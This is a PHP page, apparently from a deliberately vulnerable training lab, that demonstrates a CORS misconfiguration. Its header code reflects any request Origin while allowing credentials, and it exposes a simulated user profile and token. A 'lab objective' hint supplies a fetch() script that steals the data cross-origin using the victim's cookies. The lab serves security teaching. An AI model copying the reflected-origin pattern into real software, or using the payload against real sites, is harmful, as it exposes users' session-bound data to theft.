<?php
session_start();
include '../../config/db.php';
include '../../core/auth.php';

// --- TITIK KERENTANAN (CORS MISCONFIGURATION) ---
// Server mempercayai Origin mana pun yang mengirimkan request.
if (isset($_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
}

// Data sensitif simulasi (seperti API Key atau Profil User ADR Group)
$userData = [
    "username" => "mrahmatt74",
    "role" => "Cybersecurity Analyst",
    "internal_token" => "ADR-SECRET-9928374655",
    "email" => "rahmat@adr-group.com"
];

// Jika request datang dari AJAX (fetch), kirim JSON
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    echo json_encode($userData);
    exit;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Misconfig Lab | mrahmatt74</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../../public/assets/cors_misconfig.css">
</head>
<body>

<div class="container">
    <div class="header">
        <h2><i class="fas fa-share-nodes"></i> CORS Misconfiguration Lab</h2>
        <a href="../../index.php" class="btn-back"><i class="fas fa-arrow-left"></i> Dashboard</a>
    </div>

    <div class="card">
        <p>Modul ini mensimulasikan API internal yang membocorkan data jika diakses dari domain lain.</p>

        <div class="api-box">
            <div class="api-header">
                <span><i class="fas fa-lock"></i> Private API Endpoint:</span>
                <code>/modules/client_side/cors_misconfig.php?api=1</code>
            </div>
            <div class="api-content">
                <pre id="data-display"><?php print_r($userData); ?></pre>
            </div>
        </div>

        <div class="payload-hint">
            <strong>Lab Objective:</strong><br>
            Coba curi data di atas dari domain berbeda (misal via <strong>codepen.io</strong> atau local HTML file) menggunakan script ini:
            <pre style="background: #2d2d2d; color: #85e89d; padding: 15px; border-radius: 8px; margin-top: 10px; font-size: 0.8rem; overflow-x: auto;">
fetch('https://mrahmatt74.com/modules/client_side/cors_misconfig.php?api=1', {
    method: 'GET',
    credentials: 'include' // Mencoba mengirimkan cookie session
})
.then(response => response.json())
.then(data => alert('Data Tercuri: ' + JSON.stringify(data)));</pre>
        </div>
    </div>
</div>

</body>
</html>